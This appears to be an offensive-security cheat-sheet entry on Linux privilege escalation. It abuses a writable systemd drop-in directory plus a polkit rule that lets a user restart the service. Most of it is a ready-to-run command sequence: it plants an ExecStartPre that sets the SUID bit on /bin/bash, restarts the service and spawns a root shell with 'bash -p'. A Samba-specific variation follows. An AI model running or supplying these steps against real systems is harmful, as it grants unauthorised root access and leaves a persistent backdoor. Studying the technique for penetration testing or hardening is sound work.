# Polkit ExecStartPre via Systemd Drop-In

If a user can write to a systemd service's drop-in directory (`/etc/systemd/system/<service>.d/`) AND a polkit rule allows them to restart that service, inject an `ExecStartPre` directive to execute a command as the service's UID (often root).

```bash
# Check if the current user's group has write access to drop-in directory:
ls -la /etc/systemd/system/<service>.d/

# Check polkit rules permitting restart:
pkaction --verbose --action-id org.freedesktop.systemd1.manage-units 2>/dev/null
# or check /etc/polkit-1/rules.d/ for custom rules

# Create drop-in with ExecStartPre setuid:
cat > /etc/systemd/system/<service>.d/privesc.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c "chmod +s /bin/bash"
EOF

systemctl daemon-reload
systemctl restart <service>
/bin/bash -p   # now SUID root
```

Real-world variation: write to `smbd.d/` drop-in + polkit rule in `/etc/polkit-1/rules.d/` that permits the `samba-group` to restart `smbd`. Drop `ExecStartPre` pointing to setuid-bash creation; trigger via `pkexec systemctl restart smbd` or `systemctl restart smbd` if the polkit rule allows it without password.
